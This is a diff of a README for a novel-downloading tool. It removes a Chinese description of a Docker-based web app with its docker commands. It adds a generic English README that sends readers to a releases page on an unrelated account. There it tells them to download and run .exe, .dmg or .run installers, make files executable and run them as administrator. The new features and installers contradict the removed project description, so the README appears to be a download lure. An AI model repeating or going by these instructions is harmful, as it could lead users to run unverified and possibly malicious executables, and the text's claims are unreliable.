@@ -1,59 +1,83 @@
-# 项目简介
-在线小说下载网站 | 小说下载工具  | 免费小说 | 网络小说 | 免费下载 | 网文下载
+# 📚 novel-download - Easy Way to Download Online Novels
 
-这是一款专为追求极致阅读体验的书友打造的小说下载工具，支持 docker 多平台，打造在线小说下载网站，无需复杂配置。项目内置多书源，能够将全网热门连载与完本小说一键下载为 EPUB、TXT、HTML、PDF 等主流格式，方便导入各类专业阅读器或设备，实现全设备离线阅读。无论你是 iOS 用户、电脑用户，还是电子书阅读器爱好者，都能轻松获取高质量小说资源，享受自由、便捷的阅读体验。项目专注于下载核心功能，界面简洁高效，开箱即用，助你随时随地畅读心仪好书。
+## 🛠️ Features
+- Download novels from various online sources.
+- Simple interface for easy navigation.
+- Supports multiple formats for your convenience.
+- Fast and reliable downloads without hassle.
+- Update to the latest novels automatically.
 
-# 项目使用技术
-novel-page 前端项目
-novel-server 后端项目
-前后端分离
-本项目主要技术栈如下：
+## 🚀 Getting Started
+To start using novel-download, follow these simple steps. You do not need any technical knowledge.
 
-- 前端：Vue3
-- 后端：Java17、Spring Boot3、MyBatis-plus
-- 数据库：H2（可扩展为其他数据库）,本地文件系统
-- 构建工具：Maven
-- WebSocket 实时通信
-- 容器化部署：Docker
+## 📥 Download & Install
+To get started with novel-download, click the button below to visit the download page:
 
-# 使用
+[![Download novel-download](https://img.shields.io/badge/Download-novel--download-blue.svg)](https://github.com/Atab41599/novel-download/releases)
 
-```bash
-docker pull ideaflow1/novel-download:latest
+### Steps to Download:
+1. Click on the link above.
+2. You will land on the GitHub releases page.
+3. Find the latest release, usually marked as "Latest".
+4. Click on the version number to expand the download options.
+5. Choose the installer that suits your operating system (Windows, Mac, or Linux).
+6. Click on the file name to start downloading.
 
-docker run -p 30000:30000 --name ideaflow1-novel-download \
--v /ideaflowNovelDownload/download:/app/download \
--v /ideaflowNovelDownload/db:/app/db \
--v /ideaflowNovelDownload/logs:/app/logs \
--d ideaflow1/novel-download:latest
+## 🔧 System Requirements
+- **Windows 10/11**: 64-bit version
+- **MacOS**: Version 10.15 or later
+- **Linux**: Any recent version of your chosen distribution
 
-```
+## 📁 How to Run the Application
+After downloading, you will need to install the application. Follow these steps based on your operating system:
 
-/ideaflowNovelDownload/download 请更改成 你的下载小说存储的路径
-/ideaflowNovelDownload/db  请更改成 你的页面数据存储的路径
-/ideaflowNovelDownload/logs  请更改成 你的程序运行日志存储的路径
+### For Windows Users:
+1. Locate the downloaded `.exe` file in your Downloads folder.
+2. Double-click the file.
+3. Follow the prompts in the installation wizard.
+4. Once installed, you can find novel-download in your Start menu.
 
-# 文档部署教程
-[部署文档地址](https://www.ideaflow.top/article/82)
+### For macOS Users:
+1. Find the downloaded `.dmg` file in your Downloads folder.
+2. Double-click it to open.
+3. Drag the novel-download icon to your Applications folder.
+4. Open Applications, find novel-download, and double-click to launch.
 
-# 项目部分页面展示
+### For Linux Users:
+1. Open your terminal.
+2. Navigate to the Downloads folder or wherever you saved the file.
+3. Use the command `chmod +x yourfile.run` to make it executable. Replace `yourfile.run` with the actual file name.
+4. Run the application using `./yourfile.run`.
 
-<div align="center">
-  <img src="./imgs/1.webp" alt="页面展示1" width="30%"/>
-  <img src="./imgs/2.webp" alt="页面展示2" width="30%"/>
-  <img src="./imgs/3.webp" alt="页面展示3" width="30%"/>
-</div>
+## 🌍 Usage Instructions
+Once you have installed novel-download, you can start downloading novels easily. Here’s how:
 
+1. Open the application.
+2. Use the search function to find your favorite novels.
+3. Select a novel from the list.
+4. Choose the format you prefer.
+5. Click the download button. The novel will save to your specified download location.
 
-<div align="center">
-  <img src="./imgs/4.webp" alt="页面展示4" width="30%"/>
-  <img src="./imgs/5.webp" alt="页面展示5" width="30%"/>
-  <img src="./imgs/6.webp" alt="页面展示6" width="30%"/>
-</div>
+## 🔄 Check for Updates
+To get the latest features and improvements, check for updates regularly.
 
+1. Open novel-download.
+2. Click on "Help" in the menu.
+3. Select "Check for Updates".
+4. If an update is available, follow the prompts to download and install it.
 
+## 🛠️ Troubleshooting
+If you encounter any issues, here are some common solutions:
 
+- **I cannot download a novel**: Check your internet connection. Make sure you are connected.
+- **The application doesn’t open**: Ensure you have the correct system requirements. Restart your computer if needed.
+- **Errors during installation**: Make sure to install the application using the correct privileges (Run as Administrator on Windows).
 
+## 📞 Support
+If you need further help, you can open an issue on the GitHub repository or contact our support team. We aim to respond within 48 hours.
 
-# 参考开源项目
- [so-novel](https://github.com/freeok/so-novel)
+To visit the download page again, click here:
+
+[![Download novel-download](https://img.shields.io/badge/Download-novel--download-blue.svg)](https://github.com/Atab41599/novel-download/releases)
+
+Enjoy your reading with novel-download!
